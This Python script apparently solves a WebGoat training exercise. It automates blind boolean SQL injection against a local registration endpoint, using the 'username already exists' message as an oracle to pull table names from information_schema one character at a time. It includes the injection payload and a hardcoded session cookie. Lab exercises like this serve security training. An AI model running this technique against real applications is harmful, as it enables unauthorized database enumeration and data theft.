import json
import requests

#Character set for table name discovery
CHAR_SET = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_'

#Request headers
HEADERS = {
    'Cookie': "JSESSIONID=stwGcaftyQKVEJJ0zFtNGJXVBHNWGCfPLJnWcWBG",  
}

#Vulnerable endpoint URL
URL = 'http://127.0.0.1:8080/WebGoat/SqlInjectionAdvanced/challenge'


#Function to send the SQL injection payload as an HTTP request
def send_request(payload):
    """Send a request with the SQL injection payload."""
    request_data = {
        'username_reg': payload,
        'email_reg': 'test@example.com',
        'password_reg': 'password',
        'confirm_password_reg': 'password'
    }
    
    try:
        # Send the request and return the response
        response = requests.put(URL, headers=HEADERS, data=request_data)
        return response
    except requests.RequestException as e:
        print(f"Error during the request: {e}")
        return None


#Function to check if the response indicates a valid table name prefix
def is_valid_table_prefix(response):
    """Check if the response indicates a valid table prefix."""
    try:
        response_json = response.json()
        return "already exists please try to register with a different username" in response_json.get('feedback', '')
    except json.JSONDecodeError:
        print("Error: Could not parse the response. Please check the session ID and request format.")
        return False


#Function to discover table names based on a starting character
def discover_table_name(start_char):
    """Attempt to discover a table name starting with the provided character."""
    current_table_prefix = start_char
    
    while True:
        char_found = False
        
        for character in CHAR_SET:
            #Create the SQL injection payload
            payload = f"tom' AND EXISTS (SELECT 1 FROM information_schema.tables WHERE table_name LIKE '{current_table_prefix + character}%');--"
            
            #Send the request and get the response
            response = send_request(payload)
            if response is None:
                return None
            
            #Check if the current prefix is valid
            if is_valid_table_prefix(response):
                current_table_prefix += character
                char_found = True
                break
        
        if not char_found:
            return current_table_prefix if len(current_table_prefix) > 1 else None


#Main function to find all table names by trying every possible starting character
def find_all_table_names():
    """Discover all table names using SQL injection."""
    discovered_tables = []
    
    #Loop through potential starting characters for table names
    for start_char in CHAR_SET:
        discovered_table = discover_table_name(start_char)
        
        if discovered_table and discovered_table not in discovered_tables:
            discovered_tables.append(discovered_table)
            print(f"Discovered table: {discovered_table}")
    
    #Print all discovered tables
    print("\nAll discovered tables:")
    for table in discovered_tables:
        print(table)


#Execute the function to find all table names
find_all_table_names()